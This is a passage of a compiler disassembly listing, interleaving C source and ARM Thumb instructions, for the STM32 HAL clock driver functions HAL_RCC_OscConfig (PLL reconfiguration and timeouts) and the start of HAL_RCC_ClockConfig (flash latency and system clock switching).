 8003f16:	d109      	bne.n	8003f2c <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLR)    != ((((RCC_OscInitStruct->PLL.PLLR) >> 1U) - 1U) << RCC_PLLCFGR_PLLR_Pos)))
 8003f18:	697b      	ldr	r3, [r7, #20]
 8003f1a:	f003 62c0 	and.w	r2, r3, #100663296	; 0x6000000
 8003f1e:	687b      	ldr	r3, [r7, #4]
 8003f20:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8003f22:	085b      	lsrs	r3, r3, #1
 8003f24:	3b01      	subs	r3, #1
 8003f26:	065b      	lsls	r3, r3, #25
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 8003f28:	429a      	cmp	r2, r3
 8003f2a:	d06b      	beq.n	8004004 <HAL_RCC_OscConfig+0x780>
      {
        /* Check if the PLL is used as system clock or not */
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 8003f2c:	69bb      	ldr	r3, [r7, #24]
 8003f2e:	2b0c      	cmp	r3, #12
 8003f30:	d062      	beq.n	8003ff8 <HAL_RCC_OscConfig+0x774>
        {
#if defined(RCC_PLLSAI1_SUPPORT) || defined(RCC_PLLSAI2_SUPPORT)
          /* Check if main PLL can be updated */
          /* Not possible if the source is shared by other enabled PLLSAIx */
          if((READ_BIT(RCC->CR, RCC_CR_PLLSAI1ON) != 0U)
 8003f32:	4b32      	ldr	r3, [pc, #200]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003f34:	681b      	ldr	r3, [r3, #0]
 8003f36:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 8003f3a:	2b00      	cmp	r3, #0
 8003f3c:	d001      	beq.n	8003f42 <HAL_RCC_OscConfig+0x6be>
#if defined(RCC_PLLSAI2_SUPPORT)
             || (READ_BIT(RCC->CR, RCC_CR_PLLSAI2ON) != 0U)
#endif
            )
          {
            return HAL_ERROR;
 8003f3e:	2301      	movs	r3, #1
 8003f40:	e0ac      	b.n	800409c <HAL_RCC_OscConfig+0x818>
          }
          else
#endif /* RCC_PLLSAI1_SUPPORT || RCC_PLLSAI2_SUPPORT */
          {
            /* Disable the main PLL. */
            __HAL_RCC_PLL_DISABLE();
 8003f42:	4b2e      	ldr	r3, [pc, #184]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003f44:	681b      	ldr	r3, [r3, #0]
 8003f46:	4a2d      	ldr	r2, [pc, #180]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003f48:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 8003f4c:	6013      	str	r3, [r2, #0]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 8003f4e:	f7fd f915 	bl	800117c <HAL_GetTick>
 8003f52:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8003f54:	e008      	b.n	8003f68 <HAL_RCC_OscConfig+0x6e4>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8003f56:	f7fd f911 	bl	800117c <HAL_GetTick>
 8003f5a:	4602      	mov	r2, r0
 8003f5c:	693b      	ldr	r3, [r7, #16]
 8003f5e:	1ad3      	subs	r3, r2, r3
 8003f60:	2b02      	cmp	r3, #2
 8003f62:	d901      	bls.n	8003f68 <HAL_RCC_OscConfig+0x6e4>
              {
                return HAL_TIMEOUT;
 8003f64:	2303      	movs	r3, #3
 8003f66:	e099      	b.n	800409c <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8003f68:	4b24      	ldr	r3, [pc, #144]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003f6a:	681b      	ldr	r3, [r3, #0]
 8003f6c:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8003f70:	2b00      	cmp	r3, #0
 8003f72:	d1f0      	bne.n	8003f56 <HAL_RCC_OscConfig+0x6d2>
              }
            }

            /* Configure the main PLL clock source, multiplication and division factors. */
#if defined(RCC_PLLP_SUPPORT)
            __HAL_RCC_PLL_CONFIG(RCC_OscInitStruct->PLL.PLLSource,
 8003f74:	4b21      	ldr	r3, [pc, #132]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003f76:	68da      	ldr	r2, [r3, #12]
 8003f78:	4b21      	ldr	r3, [pc, #132]	; (8004000 <HAL_RCC_OscConfig+0x77c>)
 8003f7a:	4013      	ands	r3, r2
 8003f7c:	687a      	ldr	r2, [r7, #4]
 8003f7e:	6ad1      	ldr	r1, [r2, #44]	; 0x2c
 8003f80:	687a      	ldr	r2, [r7, #4]
 8003f82:	6b12      	ldr	r2, [r2, #48]	; 0x30
 8003f84:	3a01      	subs	r2, #1
 8003f86:	0112      	lsls	r2, r2, #4
 8003f88:	4311      	orrs	r1, r2
 8003f8a:	687a      	ldr	r2, [r7, #4]
 8003f8c:	6b52      	ldr	r2, [r2, #52]	; 0x34
 8003f8e:	0212      	lsls	r2, r2, #8
 8003f90:	4311      	orrs	r1, r2
 8003f92:	687a      	ldr	r2, [r7, #4]
 8003f94:	6bd2      	ldr	r2, [r2, #60]	; 0x3c
 8003f96:	0852      	lsrs	r2, r2, #1
 8003f98:	3a01      	subs	r2, #1
 8003f9a:	0552      	lsls	r2, r2, #21
 8003f9c:	4311      	orrs	r1, r2
 8003f9e:	687a      	ldr	r2, [r7, #4]
 8003fa0:	6c12      	ldr	r2, [r2, #64]	; 0x40
 8003fa2:	0852      	lsrs	r2, r2, #1
 8003fa4:	3a01      	subs	r2, #1
 8003fa6:	0652      	lsls	r2, r2, #25
 8003fa8:	4311      	orrs	r1, r2
 8003faa:	687a      	ldr	r2, [r7, #4]
 8003fac:	6b92      	ldr	r2, [r2, #56]	; 0x38
 8003fae:	06d2      	lsls	r2, r2, #27
 8003fb0:	430a      	orrs	r2, r1
 8003fb2:	4912      	ldr	r1, [pc, #72]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003fb4:	4313      	orrs	r3, r2
 8003fb6:	60cb      	str	r3, [r1, #12]
                                 RCC_OscInitStruct->PLL.PLLQ,
                                 RCC_OscInitStruct->PLL.PLLR);
#endif

            /* Enable the main PLL. */
            __HAL_RCC_PLL_ENABLE();
 8003fb8:	4b10      	ldr	r3, [pc, #64]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003fba:	681b      	ldr	r3, [r3, #0]
 8003fbc:	4a0f      	ldr	r2, [pc, #60]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003fbe:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8003fc2:	6013      	str	r3, [r2, #0]

            /* Enable PLL System Clock output. */
            __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 8003fc4:	4b0d      	ldr	r3, [pc, #52]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003fc6:	68db      	ldr	r3, [r3, #12]
 8003fc8:	4a0c      	ldr	r2, [pc, #48]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003fca:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8003fce:	60d3      	str	r3, [r2, #12]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 8003fd0:	f7fd f8d4 	bl	800117c <HAL_GetTick>
 8003fd4:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8003fd6:	e008      	b.n	8003fea <HAL_RCC_OscConfig+0x766>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8003fd8:	f7fd f8d0 	bl	800117c <HAL_GetTick>
 8003fdc:	4602      	mov	r2, r0
 8003fde:	693b      	ldr	r3, [r7, #16]
 8003fe0:	1ad3      	subs	r3, r2, r3
 8003fe2:	2b02      	cmp	r3, #2
 8003fe4:	d901      	bls.n	8003fea <HAL_RCC_OscConfig+0x766>
              {
                return HAL_TIMEOUT;
 8003fe6:	2303      	movs	r3, #3
 8003fe8:	e058      	b.n	800409c <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8003fea:	4b04      	ldr	r3, [pc, #16]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003fec:	681b      	ldr	r3, [r3, #0]
 8003fee:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8003ff2:	2b00      	cmp	r3, #0
 8003ff4:	d0f0      	beq.n	8003fd8 <HAL_RCC_OscConfig+0x754>
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 8003ff6:	e050      	b.n	800409a <HAL_RCC_OscConfig+0x816>
          }
        }
        else
        {
          /* PLL is already used as System core clock */
          return HAL_ERROR;
 8003ff8:	2301      	movs	r3, #1
 8003ffa:	e04f      	b.n	800409c <HAL_RCC_OscConfig+0x818>
 8003ffc:	40021000 	.word	0x40021000
 8004000:	019d808c 	.word	0x019d808c
      }
      else
      {
        /* PLL configuration is unchanged */
        /* Re-enable PLL if it was disabled (ie. low power mode) */
        if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004004:	4b27      	ldr	r3, [pc, #156]	; (80040a4 <HAL_RCC_OscConfig+0x820>)
 8004006:	681b      	ldr	r3, [r3, #0]
 8004008:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 800400c:	2b00      	cmp	r3, #0
 800400e:	d144      	bne.n	800409a <HAL_RCC_OscConfig+0x816>
        {
          /* Enable the main PLL. */
          __HAL_RCC_PLL_ENABLE();
 8004010:	4b24      	ldr	r3, [pc, #144]	; (80040a4 <HAL_RCC_OscConfig+0x820>)
 8004012:	681b      	ldr	r3, [r3, #0]
 8004014:	4a23      	ldr	r2, [pc, #140]	; (80040a4 <HAL_RCC_OscConfig+0x820>)
 8004016:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 800401a:	6013      	str	r3, [r2, #0]

          /* Enable PLL System Clock output. */
          __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 800401c:	4b21      	ldr	r3, [pc, #132]	; (80040a4 <HAL_RCC_OscConfig+0x820>)
 800401e:	68db      	ldr	r3, [r3, #12]
 8004020:	4a20      	ldr	r2, [pc, #128]	; (80040a4 <HAL_RCC_OscConfig+0x820>)
 8004022:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8004026:	60d3      	str	r3, [r2, #12]

          /* Get Start Tick*/
          tickstart = HAL_GetTick();
 8004028:	f7fd f8a8 	bl	800117c <HAL_GetTick>
 800402c:	6138      	str	r0, [r7, #16]

          /* Wait till PLL is ready */
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 800402e:	e008      	b.n	8004042 <HAL_RCC_OscConfig+0x7be>
          {
            if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 8004030:	f7fd f8a4 	bl	800117c <HAL_GetTick>
 8004034:	4602      	mov	r2, r0
 8004036:	693b      	ldr	r3, [r7, #16]
 8004038:	1ad3      	subs	r3, r2, r3
 800403a:	2b02      	cmp	r3, #2
 800403c:	d901      	bls.n	8004042 <HAL_RCC_OscConfig+0x7be>
            {
              return HAL_TIMEOUT;
 800403e:	2303      	movs	r3, #3
 8004040:	e02c      	b.n	800409c <HAL_RCC_OscConfig+0x818>
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004042:	4b18      	ldr	r3, [pc, #96]	; (80040a4 <HAL_RCC_OscConfig+0x820>)
 8004044:	681b      	ldr	r3, [r3, #0]
 8004046:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 800404a:	2b00      	cmp	r3, #0
 800404c:	d0f0      	beq.n	8004030 <HAL_RCC_OscConfig+0x7ac>
 800404e:	e024      	b.n	800409a <HAL_RCC_OscConfig+0x816>
      }
    }
    else
    {
      /* Check that PLL is not used as system clock or not */
      if(sysclk_source != RCC_CFGR_SWS_PLL)
 8004050:	69bb      	ldr	r3, [r7, #24]
 8004052:	2b0c      	cmp	r3, #12
 8004054:	d01f      	beq.n	8004096 <HAL_RCC_OscConfig+0x812>
      {
        /* Disable the main PLL. */
        __HAL_RCC_PLL_DISABLE();
 8004056:	4b13      	ldr	r3, [pc, #76]	; (80040a4 <HAL_RCC_OscConfig+0x820>)
 8004058:	681b      	ldr	r3, [r3, #0]
 800405a:	4a12      	ldr	r2, [pc, #72]	; (80040a4 <HAL_RCC_OscConfig+0x820>)
 800405c:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 8004060:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8004062:	f7fd f88b 	bl	800117c <HAL_GetTick>
 8004066:	6138      	str	r0, [r7, #16]

        /* Wait till PLL is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 8004068:	e008      	b.n	800407c <HAL_RCC_OscConfig+0x7f8>
        {
          if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 800406a:	f7fd f887 	bl	800117c <HAL_GetTick>
 800406e:	4602      	mov	r2, r0
 8004070:	693b      	ldr	r3, [r7, #16]
 8004072:	1ad3      	subs	r3, r2, r3
 8004074:	2b02      	cmp	r3, #2
 8004076:	d901      	bls.n	800407c <HAL_RCC_OscConfig+0x7f8>
          {
            return HAL_TIMEOUT;
 8004078:	2303      	movs	r3, #3
 800407a:	e00f      	b.n	800409c <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 800407c:	4b09      	ldr	r3, [pc, #36]	; (80040a4 <HAL_RCC_OscConfig+0x820>)
 800407e:	681b      	ldr	r3, [r3, #0]
 8004080:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004084:	2b00      	cmp	r3, #0
 8004086:	d1f0      	bne.n	800406a <HAL_RCC_OscConfig+0x7e6>
        }
        /* Unselect main PLL clock source and disable main PLL outputs to save power */
#if defined(RCC_PLLSAI2_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI3CLK);
#elif defined(RCC_PLLSAI1_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI2CLK);
 8004088:	4b06      	ldr	r3, [pc, #24]	; (80040a4 <HAL_RCC_OscConfig+0x820>)
 800408a:	68da      	ldr	r2, [r3, #12]
 800408c:	4905      	ldr	r1, [pc, #20]	; (80040a4 <HAL_RCC_OscConfig+0x820>)
 800408e:	4b06      	ldr	r3, [pc, #24]	; (80040a8 <HAL_RCC_OscConfig+0x824>)
 8004090:	4013      	ands	r3, r2
 8004092:	60cb      	str	r3, [r1, #12]
 8004094:	e001      	b.n	800409a <HAL_RCC_OscConfig+0x816>
#endif /* RCC_PLLSAI2_SUPPORT */
      }
      else
      {
        /* PLL is already used as System core clock */
        return HAL_ERROR;
 8004096:	2301      	movs	r3, #1
 8004098:	e000      	b.n	800409c <HAL_RCC_OscConfig+0x818>
      }
    }
  }
  return HAL_OK;
 800409a:	2300      	movs	r3, #0
}
 800409c:	4618      	mov	r0, r3
 800409e:	3720      	adds	r7, #32
 80040a0:	46bd      	mov	sp, r7
 80040a2:	bd80      	pop	{r7, pc}
 80040a4:	40021000 	.word	0x40021000
 80040a8:	feeefffc 	.word	0xfeeefffc

080040ac <HAL_RCC_ClockConfig>:
  *         HPRE[3:0] bits to ensure that HCLK not exceed the maximum allowed frequency
  *         (for more details refer to section above "Initialization/de-initialization functions")
  * @retval None
  */
HAL_StatusTypeDef HAL_RCC_ClockConfig(RCC_ClkInitTypeDef  *RCC_ClkInitStruct, uint32_t FLatency)
{
 80040ac:	b580      	push	{r7, lr}
 80040ae:	b084      	sub	sp, #16
 80040b0:	af00      	add	r7, sp, #0
 80040b2:	6078      	str	r0, [r7, #4]
 80040b4:	6039      	str	r1, [r7, #0]
  uint32_t hpre = RCC_SYSCLK_DIV1;
#endif
  HAL_StatusTypeDef status;

  /* Check Null pointer */
  if(RCC_ClkInitStruct == NULL)
 80040b6:	687b      	ldr	r3, [r7, #4]
 80040b8:	2b00      	cmp	r3, #0
 80040ba:	d101      	bne.n	80040c0 <HAL_RCC_ClockConfig+0x14>
  {
    return HAL_ERROR;
 80040bc:	2301      	movs	r3, #1
 80040be:	e0e7      	b.n	8004290 <HAL_RCC_ClockConfig+0x1e4>
  /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
    must be correctly programmed according to the frequency of the CPU clock
    (HCLK) and the supply voltage of the device. */

  /* Increasing the number of wait states because of higher CPU frequency */
  if(FLatency > __HAL_FLASH_GET_LATENCY())
 80040c0:	4b75      	ldr	r3, [pc, #468]	; (8004298 <HAL_RCC_ClockConfig+0x1ec>)
 80040c2:	681b      	ldr	r3, [r3, #0]
 80040c4:	f003 0307 	and.w	r3, r3, #7
 80040c8:	683a      	ldr	r2, [r7, #0]
 80040ca:	429a      	cmp	r2, r3
 80040cc:	d910      	bls.n	80040f0 <HAL_RCC_ClockConfig+0x44>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 80040ce:	4b72      	ldr	r3, [pc, #456]	; (8004298 <HAL_RCC_ClockConfig+0x1ec>)
 80040d0:	681b      	ldr	r3, [r3, #0]
 80040d2:	f023 0207 	bic.w	r2, r3, #7
 80040d6:	4970      	ldr	r1, [pc, #448]	; (8004298 <HAL_RCC_ClockConfig+0x1ec>)
 80040d8:	683b      	ldr	r3, [r7, #0]
 80040da:	4313      	orrs	r3, r2
 80040dc:	600b      	str	r3, [r1, #0]

    /* Check that the new number of wait states is taken into account to access the Flash
    memory by reading the FLASH_ACR register */
    if(__HAL_FLASH_GET_LATENCY() != FLatency)
 80040de:	4b6e      	ldr	r3, [pc, #440]	; (8004298 <HAL_RCC_ClockConfig+0x1ec>)
 80040e0:	681b      	ldr	r3, [r3, #0]
 80040e2:	f003 0307 	and.w	r3, r3, #7
 80040e6:	683a      	ldr	r2, [r7, #0]
 80040e8:	429a      	cmp	r2, r3
 80040ea:	d001      	beq.n	80040f0 <HAL_RCC_ClockConfig+0x44>
    {
      return HAL_ERROR;
 80040ec:	2301      	movs	r3, #1
 80040ee:	e0cf      	b.n	8004290 <HAL_RCC_ClockConfig+0x1e4>
    }
  }

  /*----------------- HCLK Configuration prior to SYSCLK----------------------*/
  /* Apply higher HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is increased */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 80040f0:	687b      	ldr	r3, [r7, #4]
 80040f2:	681b      	ldr	r3, [r3, #0]
 80040f4:	f003 0302 	and.w	r3, r3, #2
 80040f8:	2b00      	cmp	r3, #0
 80040fa:	d010      	beq.n	800411e <HAL_RCC_ClockConfig+0x72>
  {
    assert_param(IS_RCC_HCLK(RCC_ClkInitStruct->AHBCLKDivider));

    if(RCC_ClkInitStruct->AHBCLKDivider > READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 80040fc:	687b      	ldr	r3, [r7, #4]
 80040fe:	689a      	ldr	r2, [r3, #8]
 8004100:	4b66      	ldr	r3, [pc, #408]	; (800429c <HAL_RCC_ClockConfig+0x1f0>)
 8004102:	689b      	ldr	r3, [r3, #8]
 8004104:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8004108:	429a      	cmp	r2, r3
 800410a:	d908      	bls.n	800411e <HAL_RCC_ClockConfig+0x72>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 800410c:	4b63      	ldr	r3, [pc, #396]	; (800429c <HAL_RCC_ClockConfig+0x1f0>)
 800410e:	689b      	ldr	r3, [r3, #8]
 8004110:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8004114:	687b      	ldr	r3, [r7, #4]
 8004116:	689b      	ldr	r3, [r3, #8]
 8004118:	4960      	ldr	r1, [pc, #384]	; (800429c <HAL_RCC_ClockConfig+0x1f0>)
 800411a:	4313      	orrs	r3, r2
 800411c:	608b      	str	r3, [r1, #8]
    }
  }

  /*------------------------- SYSCLK Configuration ---------------------------*/
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_SYSCLK) == RCC_CLOCKTYPE_SYSCLK)
 800411e:	687b      	ldr	r3, [r7, #4]
 8004120:	681b      	ldr	r3, [r3, #0]
 8004122:	f003 0301 	and.w	r3, r3, #1
 8004126:	2b00      	cmp	r3, #0
 8004128:	d04c      	beq.n	80041c4 <HAL_RCC_ClockConfig+0x118>
  {
    assert_param(IS_RCC_SYSCLKSOURCE(RCC_ClkInitStruct->SYSCLKSource));

    /* PLL is selected as System Clock Source */
    if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_PLLCLK)
 800412a:	687b      	ldr	r3, [r7, #4]
 800412c:	685b      	ldr	r3, [r3, #4]
 800412e:	2b03      	cmp	r3, #3
 8004130:	d107      	bne.n	8004142 <HAL_RCC_ClockConfig+0x96>
    {
      /* Check the PLL ready flag */
      if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004132:	4b5a      	ldr	r3, [pc, #360]	; (800429c <HAL_RCC_ClockConfig+0x1f0>)
 8004134:	681b      	ldr	r3, [r3, #0]
 8004136:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 800413a:	2b00      	cmp	r3, #0
 800413c:	d121      	bne.n	8004182 <HAL_RCC_ClockConfig+0xd6>
      {
        return HAL_ERROR;
 800413e:	2301      	movs	r3, #1
 8004140:	e0a6      	b.n	8004290 <HAL_RCC_ClockConfig+0x1e4>
#endif
    }
    else
    {
      /* HSE is selected as System Clock Source */
      if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_HSE)
 8004142:	687b      	ldr	r3, [r7, #4]
 8004144:	685b      	ldr	r3, [r3, #4]
 8004146:	2b02      	cmp	r3, #2
 8004148:	d107      	bne.n	800415a <HAL_RCC_ClockConfig+0xae>
      {
        /* Check the HSE ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 800414a:	4b54      	ldr	r3, [pc, #336]	; (800429c <HAL_RCC_ClockConfig+0x1f0>)
 800414c:	681b      	ldr	r3, [r3, #0]
 800414e:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8004152:	2b00      	cmp	r3, #0
 8004154:	d115      	bne.n	8004182 <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 8004156:	2301      	movs	r3, #1
 8004158:	e09a      	b.n	8004290 <HAL_RCC_ClockConfig+0x1e4>
        }
      }
      /* MSI is selected as System Clock Source */
      else if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_MSI)
 800415a:	687b      	ldr	r3, [r7, #4]
 800415c:	685b      	ldr	r3, [r3, #4]
 800415e:	2b00      	cmp	r3, #0
 8004160:	d107      	bne.n	8004172 <HAL_RCC_ClockConfig+0xc6>
      {
        /* Check the MSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8004162:	4b4e      	ldr	r3, [pc, #312]	; (800429c <HAL_RCC_ClockConfig+0x1f0>)
 8004164:	681b      	ldr	r3, [r3, #0]
 8004166:	f003 0302 	and.w	r3, r3, #2
 800416a:	2b00      	cmp	r3, #0
 800416c:	d109      	bne.n	8004182 <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 800416e:	2301      	movs	r3, #1
 8004170:	e08e      	b.n	8004290 <HAL_RCC_ClockConfig+0x1e4>
      }
      /* HSI is selected as System Clock Source */
      else
      {
        /* Check the HSI ready flag */
        if(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8004172:	4b4a      	ldr	r3, [pc, #296]	; (800429c <HAL_RCC_ClockConfig+0x1f0>)
 8004174:	681b      	ldr	r3, [r3, #0]
 8004176:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 800417a:	2b00      	cmp	r3, #0
 800417c:	d101      	bne.n	8004182 <HAL_RCC_ClockConfig+0xd6>
        {
          return HAL_ERROR;
 800417e:	2301      	movs	r3, #1
 8004180:	e086      	b.n	8004290 <HAL_RCC_ClockConfig+0x1e4>
      }
#endif

    }

    MODIFY_REG(RCC->CFGR, RCC_CFGR_SW, RCC_ClkInitStruct->SYSCLKSource);
 8004182:	4b46      	ldr	r3, [pc, #280]	; (800429c <HAL_RCC_ClockConfig+0x1f0>)
 8004184:	689b      	ldr	r3, [r3, #8]
 8004186:	f023 0203 	bic.w	r2, r3, #3
 800418a:	687b      	ldr	r3, [r7, #4]
 800418c:	685b      	ldr	r3, [r3, #4]
 800418e:	4943      	ldr	r1, [pc, #268]	; (800429c <HAL_RCC_ClockConfig+0x1f0>)
 8004190:	4313      	orrs	r3, r2
 8004192:	608b      	str	r3, [r1, #8]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 8004194:	f7fc fff2 	bl	800117c <HAL_GetTick>
 8004198:	60f8      	str	r0, [r7, #12]

    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 800419a:	e00a      	b.n	80041b2 <HAL_RCC_ClockConfig+0x106>
    {
      if((HAL_GetTick() - tickstart) > CLOCKSWITCH_TIMEOUT_VALUE)
 800419c:	f7fc ffee 	bl	800117c <HAL_GetTick>
 80041a0:	4602      	mov	r2, r0
 80041a2:	68fb      	ldr	r3, [r7, #12]
 80041a4:	1ad3      	subs	r3, r2, r3
 80041a6:	f241 3288 	movw	r2, #5000	; 0x1388
 80041aa:	4293      	cmp	r3, r2
 80041ac:	d901      	bls.n	80041b2 <HAL_RCC_ClockConfig+0x106>
      {
        return HAL_TIMEOUT;
 80041ae:	2303      	movs	r3, #3
 80041b0:	e06e      	b.n	8004290 <HAL_RCC_ClockConfig+0x1e4>
    while(__HAL_RCC_GET_SYSCLK_SOURCE() != (RCC_ClkInitStruct->SYSCLKSource << RCC_CFGR_SWS_Pos))
 80041b2:	4b3a      	ldr	r3, [pc, #232]	; (800429c <HAL_RCC_ClockConfig+0x1f0>)
 80041b4:	689b      	ldr	r3, [r3, #8]
 80041b6:	f003 020c 	and.w	r2, r3, #12
 80041ba:	687b      	ldr	r3, [r7, #4]
 80041bc:	685b      	ldr	r3, [r3, #4]
 80041be:	009b      	lsls	r3, r3, #2
 80041c0:	429a      	cmp	r2, r3
 80041c2:	d1eb      	bne.n	800419c <HAL_RCC_ClockConfig+0xf0>
  }
#endif

  /*----------------- HCLK Configuration after SYSCLK-------------------------*/
  /* Apply lower HCLK prescaler request here to ensure CPU clock is not of of spec when SYSCLK is set */
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 80041c4:	687b      	ldr	r3, [r7, #4]
 80041c6:	681b      	ldr	r3, [r3, #0]
 80041c8:	f003 0302 	and.w	r3, r3, #2
 80041cc:	2b00      	cmp	r3, #0
 80041ce:	d010      	beq.n	80041f2 <HAL_RCC_ClockConfig+0x146>
  {
    if(RCC_ClkInitStruct->AHBCLKDivider < READ_BIT(RCC->CFGR, RCC_CFGR_HPRE))
 80041d0:	687b      	ldr	r3, [r7, #4]
 80041d2:	689a      	ldr	r2, [r3, #8]
 80041d4:	4b31      	ldr	r3, [pc, #196]	; (800429c <HAL_RCC_ClockConfig+0x1f0>)
 80041d6:	689b      	ldr	r3, [r3, #8]
 80041d8:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 80041dc:	429a      	cmp	r2, r3
 80041de:	d208      	bcs.n	80041f2 <HAL_RCC_ClockConfig+0x146>
    {
      MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 80041e0:	4b2e      	ldr	r3, [pc, #184]	; (800429c <HAL_RCC_ClockConfig+0x1f0>)
 80041e2:	689b      	ldr	r3, [r3, #8]
 80041e4:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 80041e8:	687b      	ldr	r3, [r7, #4]
 80041ea:	689b      	ldr	r3, [r3, #8]
 80041ec:	492b      	ldr	r1, [pc, #172]	; (800429c <HAL_RCC_ClockConfig+0x1f0>)
 80041ee:	4313      	orrs	r3, r2
 80041f0:	608b      	str	r3, [r1, #8]
    }
  }

  /* Allow decreasing of the number of wait states (because of lower CPU frequency expected) */
  if(FLatency < __HAL_FLASH_GET_LATENCY())
 80041f2:	4b29      	ldr	r3, [pc, #164]	; (8004298 <HAL_RCC_ClockConfig+0x1ec>)
 80041f4:	681b      	ldr	r3, [r3, #0]
 80041f6:	f003 0307 	and.w	r3, r3, #7
 80041fa:	683a      	ldr	r2, [r7, #0]
 80041fc:	429a      	cmp	r2, r3
 80041fe:	d210      	bcs.n	8004222 <HAL_RCC_ClockConfig+0x176>
  {
    /* Program the new number of wait states to the LATENCY bits in the FLASH_ACR register */
    __HAL_FLASH_SET_LATENCY(FLatency);
 8004200:	4b25      	ldr	r3, [pc, #148]	; (8004298 <HAL_RCC_ClockConfig+0x1ec>)
 8004202:	681b      	ldr	r3, [r3, #0]
 8004204:	f023 0207 	bic.w	r2, r3, #7
 8004208:	4923      	ldr	r1, [pc, #140]	; (8004298 <HAL_RCC_ClockConfig+0x1ec>)
